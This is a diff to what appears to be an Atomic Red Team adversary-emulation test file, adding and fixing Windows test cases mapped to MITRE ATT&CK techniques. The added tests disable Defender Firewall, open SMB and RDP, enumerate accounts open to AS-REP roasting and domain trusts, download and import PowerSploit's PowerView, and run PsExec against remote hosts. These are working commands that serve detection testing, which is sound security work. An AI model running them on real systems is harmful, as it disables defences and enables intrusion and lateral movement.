@@ -22118,6 +22118,36 @@ defense-evasion:
             systemctl disable firewalld
           fi
         name: sh
+    - name: Disable Microsoft Defender Firewall
+      auto_generated_guid: 88d05800-a5e4-407e-9b53-ece4174f197f
+      description: |
+        Disables the Microsoft Defender Firewall for the current profile.
+        Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...
+      supported_platforms:
+      - windows
+      executor:
+        command: 'netsh advfirewall set currentprofile state off
+
+'
+        cleanup_command: 'netsh advfirewall set currentprofile state on
+
+'
+        name: command_prompt
+    - name: Allow SMB and RDP on Microsoft Defender Firewall
+      auto_generated_guid: d9841bf8-f161-4c73-81e9-fd773a5ff8c1
+      description: |
+        Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.
+        Caution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+          netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
+        cleanup_command: 'netsh advfirewall reset
+
+'
+        name: command_prompt
   T1562.001:
     technique:
       external_references:
@@ -35455,6 +35485,20 @@ discovery:
         command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
           Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose'
         name: powershell
+    - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
+      auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
+      description: |
+        When successful, accounts that do not require kerberos pre-auth will be returned
+        Requires the Active Directory module for powershell to be installed
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth
+          -eq $TRUE}
+
+'
   T1482:
     technique:
       id: attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0
@@ -35548,6 +35592,10 @@ discovery:
         This technique has been used by the Trickbot malware family.
       supported_platforms:
       - windows
+      dependencies:
+      - description: nltest.exe from RSAT must be present on disk
+        prereq_command: WHERE nltest.exe >NUL 2>&1
+        get_prereq_command: echo Sorry RSAT must be installed manually
       executor:
         command: 'nltest /domain_trusts
 
@@ -35555,13 +35603,25 @@ discovery:
         name: command_prompt
     - name: Powershell enumerate domains and forests
       auto_generated_guid: c58fbc62-8a62-489e-8f2d-3565d7d96f30
-      description: 'Use powershell to enumerate AD information
-
-'
+      description: |
+        Use powershell to enumerate AD information.
+        Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: PowerView PowerShell script must exist on disk
+        prereq_command: if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit
+          1}
+        get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
+          -OutFile "$env:TEMP\PowerView.ps1"
+      - description: RSAT PowerShell AD admin cmdlets must be installed
+        prereq_command: if ((Get-Command "Get-ADDomain") -And (Get-Command "Get-ADGroupMember"))
+          { exit 0 } else { exit 1 }
+        get_prereq_command: Write-Host "Sorry RSAT must be installed manually"
       executor:
         command: |
+          Import-Module "$env:TEMP\PowerView.ps1"
           Get-NetDomainTrust
           Get-NetForestTrust
           Get-ADDomain
@@ -37775,7 +37835,7 @@ discovery:
           wmic useraccount get /ALL
           quser /SERVER:"#{computer_name}"
           quser
-          qwinsta.exe" /server:#{computer_name}
+          qwinsta.exe /server:#{computer_name}
           qwinsta.exe
           for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
           @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@@ -40157,7 +40217,7 @@ execution:
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
-          New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+          New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
         command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
